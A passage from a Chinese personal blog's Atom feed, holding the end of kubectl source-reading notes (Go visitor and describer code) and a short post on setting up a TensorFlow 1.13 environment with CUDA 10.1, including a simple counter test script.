class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; NewDecoratedVisitor will create a visitor that invokes the provided visitor functions before</span><br><span class="line">&#x2F;&#x2F; the user supplied visitor function is invoked, giving them the opportunity to mutate the Info</span><br><span class="line">&#x2F;&#x2F; object or terminate early with an error.</span><br><span class="line">func NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor &#123;</span><br><span class="line">    if len(fn) &#x3D;&#x3D; 0 &#123;</span><br><span class="line">        return v</span><br><span class="line">    &#125;</span><br><span class="line">    return DecoratedVisitor&#123;v, fn&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Visit implements Visitor</span><br><span class="line">func (v DecoratedVisitor) Visit(fn VisitorFunc) error &#123;</span><br><span class="line">    return v.visitor.Visit(func(info *Info, err error) error &#123;</span><br><span class="line">        if err !&#x3D; nil &#123;</span><br><span class="line">            return err</span><br><span class="line">        &#125;</span><br><span class="line">        for i :&#x3D; range v.decorators &#123;</span><br><span class="line">            if err :&#x3D; v.decorators[i](info, nil); err !&#x3D; nil &#123;</span><br><span class="line">                return err</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return fn(info, nil)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印提取到的数据主要是调用注册的describe方法，会根据用户的请求如下获取对应的describe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">describer, err :&#x3D; f.Describer(mapping)</span><br></pre></td></tr></table></figure><p>Describe 集合中注册了 对K8s各种数据的打印方法(针对visit转化后的通用数据)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">func init() &#123;</span><br><span class="line">    d :&#x3D; &amp;Describers&#123;&#125;</span><br><span class="line">    err :&#x3D; d.Add(</span><br><span class="line">        describeLimitRange,</span><br><span class="line">        describeQuota,</span><br><span class="line">        describePod,</span><br><span class="line">        describeService,</span><br><span class="line">        describeReplicationController,</span><br><span class="line">        describeDaemonSet,</span><br><span class="line">        describeNode,              &#x2F;&#x2F;打印节点</span><br><span class="line">        describeNamespace,</span><br><span class="line">    )</span><br><span class="line">    if err !&#x3D; nil &#123;</span><br><span class="line">        glog.Fatalf(&quot;Cannot register describers: %v&quot;, err)</span><br><span class="line">    &#125;</span><br><span class="line">    DefaultObjectDescriber &#x3D; d</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用获取到的对应的Describe作打印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;遍历整理出的返回信息</span><br><span class="line">for _, info :&#x3D; range infos &#123;</span><br><span class="line">        &#x2F;&#x2F; 执行打印操作</span><br><span class="line">        s, err :&#x3D; describer.Describe(info.Namespace, info.Name, *describerSettings)</span><br><span class="line">        &#x2F;&#x2F; ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;kubectl-学习笔记&quot;&gt;&lt;a href=&quot;#kubectl-学习笔记&quot; class=&quot;headerlink&quot; title=&quot;kubectl 学习笔记&quot;&gt;&lt;/a&gt;kubectl 学习笔记&lt;/h2&gt;&lt;p&gt;思考：kubectl 和docker命令源码的设计思想类似。
      
    
    </summary>
    
    
      <category term="k8s" scheme="http://www.mydreamdll.xyz/categories/k8s/"/>
    
    
      <category term="k8s" scheme="http://www.mydreamdll.xyz/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>tensorflow环境安装</title>
    <link href="http://www.mydreamdll.xyz/2017/05/26/tensorflow%E5%AE%89%E8%A3%85%E5%B0%8F%E7%BB%93/"/>
    <id>http://www.mydreamdll.xyz/2017/05/26/tensorflow%E5%AE%89%E8%A3%85%E5%B0%8F%E7%BB%93/</id>
    <published>2017-05-26T12:12:57.000Z</published>
    <updated>2020-01-18T14:31:32.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="深度学习环境-tensorflow安装"><a href="#深度学习环境-tensorflow安装" class="headerlink" title="深度学习环境 tensorflow安装"></a>深度学习环境 tensorflow安装</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>需要支持RTX2080ti显卡，最好有11g现存。</p><p>本人使用CUDA10.1，cudnn 10.1适配。</p><p>python3.7 pycharm安装。</p><p>anaconde3 安装多次使用了 anaconde3 4.4 版本安装上了。</p><p>之后安装tensorflow，安装版本1.13版本的支持10.1的版本的tensorflow.</p><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个变量, 初始化为标量 0.</span></span><br><span class="line">state = tf.Variable(<span class="number">0</span>, name=<span class="string">"counter"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 op, 其作用是使 state 增加 1</span></span><br><span class="line">one = tf.constant(<span class="number">1</span>)</span><br><span class="line">new_value = tf.add(state, one)</span><br><span class="line">update = tf.assign(state, new_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动图后, 变量必须先经过`初始化` (init) op 初始化,</span></span><br><span class="line"><span class="comment"># 首先必须增加一个`初始化` op 到图中.</span></span><br><span class="line"><span class="comment"># initialize_all_variables 警告换成 global_variables_initializer</span></span><br><span class="line">init_op = tf.global_variables_initializer()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动图, 运行 op</span></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    <span class="comment"># 运行 'init' op</span></span><br><span class="line">    sess.run(init_op)</span><br><span class="line">    <span class="comment"># 打印 'state' 的初始值</span></span><br><span class="line">    print(sess.run(state))</span><br><span class="line">    <span class="comment"># 运行 op, 更新 'state', 并打印 'state'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        sess.run(update)</span><br><span class="line">        print(sess.run(state))</span><br></pre></td></tr></table></figure><p>运行成功则正常。</p><p>开启旅程啦~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;深度学习环境-tensorflow安装&quot;&gt;&lt;a href=&quot;#深度学习环境-tensorflow安装&quot; class=&quot;headerlink&quot; title=&quot;深度学习环境 tensorflow安装&quot;&gt;&lt;/a&gt;深度学习环境 tensorflow安装&lt;/h2&gt;&lt;h3 i
      
    
    </summary>
    
    
      <category term="深度学习" scheme="http://www.mydreamdll.xyz/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="深度学习" scheme="http://www.mydreamdll.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
